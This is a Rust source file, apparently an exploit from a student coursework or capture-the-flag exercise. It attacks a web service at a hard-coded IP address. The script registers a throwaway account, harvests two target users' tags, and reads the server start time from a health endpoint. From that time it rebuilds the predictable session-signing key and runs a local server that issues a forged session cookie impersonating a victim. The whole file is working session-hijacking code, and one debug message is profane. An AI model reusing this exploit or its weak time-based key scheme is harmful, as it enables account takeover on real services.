use reqwest::Client;
use reqwest::cookie::Jar;
use reqwest::StatusCode;
use serde_json::Value;
use std::sync::Mutex;
use std::fs;
use std::sync::Arc;
use actix_web::{ web, App, HttpServer };
use actix_session::{ SessionMiddleware, storage::CookieSessionStore, Session };
use actix_web::{ cookie::Key, HttpResponse };

pub fn generate_session_key(start_time: u64) -> Key {
    let time_bytes = start_time.to_be_bytes();
    let mut key_bytes = [0u8; 64];
    for (i, byte) in key_bytes.iter_mut().enumerate() {
        *byte = time_bytes[i % 8];
    }
    Key::from(&key_bytes)
}

// Функция для генерации случайных данных
fn rnd_username() -> String {
    rnd_string(8)
}

fn rnd_string(length: usize) -> String {
    use rand::{ distributions::Alphanumeric, Rng };
    rand::thread_rng().sample_iter(&Alphanumeric).take(length).map(char::from).collect()
}

fn rnd_password() -> String {
    rnd_string(16)
}

pub async fn steal_session(session: Session, tags: web::Data<Mutex<Vec<String>>>) -> HttpResponse {
    let tags = tags.lock().unwrap();
    if let Some(tag) = tags.get(0) {
        session.insert("user_tag", tag.clone()).unwrap();
        HttpResponse::Ok().body("Session stolen")
    } else {
        HttpResponse::InternalServerError().body("No tags available")
    }
}

async fn run_server(start_time: u64, tags: Vec<String>) -> std::io::Result<()> {
    let tags = web::Data::new(Mutex::new(tags));
    HttpServer::new(move || {
        let session_key = generate_session_key(start_time);

        let session = SessionMiddleware::builder(CookieSessionStore::default(), session_key)
            .cookie_content_security(actix_session::config::CookieContentSecurity::Signed)
            .cookie_secure(false)
            .build();

        App::new()
            .app_data(tags.clone())
            .wrap(session)
            .service(web::resource("/").route(web::get().to(steal_session)))
    })
        .bind("127.0.0.1:228")?
        .run().await
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let url = "http://89.169.167.196:6969";

    // Чтение attack_data.json
    let attack_data: Value = {
        let file_content = fs
            ::read_to_string(
                "/home/kali/Desktop/VSCode_files/STUDY/kursach/writeup/attack_data.json"
            )
            .expect("Failed to read attack_data.json");
        serde_json::from_str(&file_content).expect("Invalid JSON in attack_data.json")
    };

    // Создание клиента с поддержкой cookies
    let cookie_store = Arc::new(Jar::default());
    let client = Client::builder()
        .cookie_store(true)
        .cookie_provider(cookie_store.clone())
        .build()
        .expect("Failed to build client");

    let mut nick = rnd_username();
    let mut tag = rnd_string(10);
    let mut passw = rnd_password();

    // Регистрация
    let mut response = client
        .post(format!("{}/register", url))
        .json(
            &serde_json::json!({
            "nickname": nick,
            "tag": tag,
            "password": passw
        })
        )
        .send().await
        .expect("Failed to send registration request");

    while response.status() != StatusCode::CREATED {
        nick = rnd_username();
        tag = rnd_string(10);
        passw = rnd_password();

        response = client
            .post(format!("{}/register", url))
            .json(
                &serde_json::json!({
                "nickname": nick,
                "tag": tag,
                "password": passw
            })
            )
            .send().await
            .expect("Failed to send registration request");
    }

    // Создание сессии
    let response = client
        .post(format!("{}/login", url))
        .json(&serde_json::json!({
            "tag": tag,
            "password": passw
        }))
        .send().await
        .expect("Failed to send login request");

    assert!(response.status() == StatusCode::OK, "Login failed with status: {}", response.status());

    // Получение списка пользователей
    let response = client
        .get(format!("{}/users", url))
        .send().await
        .expect("Failed to fetch users");

    assert!(
        response.status() == StatusCode::OK,
        "Failed to fetch users with status: {}",
        response.status()
    );

    let users: Vec<Value> = response.json().await.expect("Failed to parse users response as JSON");

    let mut tags = Vec::new();
    for user in &users {
        if let Some(nickname) = user["nickname"].as_str() {
            if
                nickname == attack_data["nickname_1"].as_str().unwrap() ||
                nickname == attack_data["nickname_2"].as_str().unwrap()
            {
                if let Some(user_tag) = user["tag"].as_str() {
                    tags.push(user_tag.to_string());
                }
            }
        }
    }

    if tags.len() != 2 {
        println!("ПИЗДААААА");
        std::process::exit(1);
    }

    let response = client
        .get(format!("{}/health", url))
        .send().await
        .expect("Failed to fetch health");

    let response_text = response.text().await.expect("Failed to extract text from response");

    // Разделение строки и получение второго элемента
    let start_time = response_text
        .split(", ")
        .nth(1) // Получение второй части после запятой
        .expect("Failed to find start_time")
        .parse::<u64>()
        .expect("Failed to parse start_time as u64");

    println!("Start time: {}", start_time);
    run_server(start_time, tags).await
}
